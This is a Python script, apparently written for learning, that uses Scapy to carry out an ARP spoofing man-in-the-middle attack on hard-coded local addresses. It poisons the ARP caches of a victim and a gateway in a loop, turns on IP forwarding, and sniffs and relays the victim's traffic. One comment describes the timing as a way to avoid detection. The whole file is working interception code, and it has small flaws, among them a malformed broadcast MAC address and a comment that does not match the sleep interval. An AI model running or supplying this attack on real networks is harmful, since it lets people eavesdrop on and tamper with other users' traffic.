import os
import time
from scapy.layers.l2 import ARP, Ether, srp
from scapy.all import send, sniff
from scapy.layers.inet import IP
from scapy.sendrecv import sendp
import threading

victim_ip = "172.20.10.2"
gateway_ip = "172.20.10.1"
attacker_ip = "172.20.10.5"

victim_mac = None
gateway_mac = None
attacker_mac = None

def get_mac(ip):
    """
    Sends an ARP request to retrieve the MAC address corresponding to the given IP address.
    Returns the MAC address if found, or None otherwise.
    """
    arp_request = ARP(pdst=ip)  # Protocol destination. tells the ARP layer which IP address we're trying to resolve to a MAC address.
    broadcast = Ether(dst="ff:ff:ff:ff")  # Creates an Ethernet broadcast frame
    arp_request_broadcast = broadcast/arp_request  # Combines the Ethernet broadcast frame with the ARP request to form a complete ARP packet.
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]  # (srp stands for send and receive packets). Sends the ARP packet at Layer 2 and waits for a responses; captures the first element of the response list.

    if answered_list:
        return answered_list[0][1].hwsrc  # (hwsrc stands for hardware source) Extracts the MAC address from the first response
    return None

def arp_spoof(target_ip, target_mac, spoof_ip, spoof_mac):
    # Creates an ARP response to poison the target's ARP cache,
    # associating the spoofed ip (the victim's/gateway's ip) with the attacker's MAC address
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    send(arp_response, verbose=False)

def enable_ip_forwarding():
    #  Enables IP forwarding on the attacker's system to allow the machine to act as a router.
    os.system("sudo sysctl -w net.ipv4.ip_forward=1")

def restore_arp():
    print("Restoring ARP tables...")
    # Restores the ARP tables of the victim and gateway by sending the correct MAC-IP associations.
    arp_spoof(victim_ip, victim_mac, gateway_ip, gateway_mac)
    arp_spoof(gateway_ip, gateway_mac, victim_ip, victim_mac)

def forward_packet(packet):
    """
    Inspects and processes each captured packet (like inspecting fish caught in a net).
    This function analyzes the packet, checking its attributes (like source IP), and decides how to handle it.
    The packet can be forwarded, saved, or modified based on the inspection results.
    """
    if packet.haslayer(IP):  # Checks if the packet contains an IP layer (layer 3 of the OSI model)
        if packet[IP].src == victim_ip:
            print("Forwarding packet from victim to gateway...")
            #packet[Ether].dst = gateway_mac  # Modifies the ethernet header of the frame to the gateway's MAC address
            sendp(packet, iface="wlp1s0f0", verbose=False)  # Forwards to gateway
        elif packet[IP].src == gateway_ip:
            print("Forwarding packet from gateway to victim...")
            #packet[Ether].dst = victim_mac
            sendp(packet, iface="wlp1s0f0", verbose=False)  # Forwards to victim

def sniff_packets():
    """
    Captures network packets on the specified interface (acting like a net) based on the given filter.
    The captured packets are passed to the `forward_packet` function for inspection and processing.
    This function listens for all IP packets (or other specified types) and then hands them off for further analysis.
    """
    sniff(iface="wlp1s0f0", filter="ip", prn=forward_packet, store=0)

def start_arp_spoofing():
    """
    Starts the ARP spoofing process, continuously sending forged ARP responses
    to poison the victim's and gateway's ARP caches.
    """
    global victim_mac, attacker_mac, gateway_mac
    victim_mac = get_mac(victim_ip)
    attacker_mac = get_mac(attacker_ip)
    gateway_mac = get_mac(gateway_ip)
    print("Starting ARP spoofing...")
    while True:
        arp_spoof(victim_ip, victim_mac, gateway_ip, attacker_mac)  # Poisons victim's ARP table
        arp_spoof(gateway_ip, gateway_mac, victim_ip, attacker_mac)
        time.sleep(5)  # Waits 2 seconds before sending the next spoofing packets to avoid detection

def main():
    enable_ip_forwarding()

    # Uses separate threads to handle ARP spoofing and packet sniffing/forwarding concurrently.
    spoof_thread = threading.Thread(target=start_arp_spoofing)
    spoof_thread.daemon=True
    spoof_thread.start()

    sniff_thread = threading.Thread(target=sniff_packets)
    sniff_thread.daemon = True
    sniff_thread.start()

    try:
        while True:
            time.sleep(1)  # Sleeps for 1 second in each iteration to keep the program alive
    except KeyboardInterrupt:  # Handles Ctrl+C gracefully
        restore_arp()  # Restores ARP tables
        print("\nArp spoofing stopped.")

if __name__ == "__main__":
    main()

